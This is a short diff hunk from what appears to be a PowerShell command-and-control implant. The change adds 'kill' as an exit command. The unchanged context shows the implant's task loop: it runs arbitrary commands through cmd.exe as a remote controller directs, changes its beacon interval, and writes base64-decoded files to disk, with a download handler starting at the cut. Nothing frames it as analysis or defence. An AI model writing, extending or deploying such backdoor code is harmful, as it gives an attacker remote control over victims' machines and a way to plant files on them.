@@ -68,7 +68,7 @@ while($true){
      if($t.type -eq 'shell'){
       $out=(& cmd.exe /c $t.command 2>&1|Out-String)
      }elseif($t.type -eq 'sleep'){$C.interval=[int]$t.arg}
-     elseif($t.type -eq 'exit'){exit}
+     elseif($t.type -in @('exit','kill')){exit}
      elseif($t.type -eq 'upload'){
       [IO.File]::WriteAllBytes($t.path,[Convert]::FromBase64String($t.data));$out='uploaded'
      }elseif($t.type -eq 'download'){
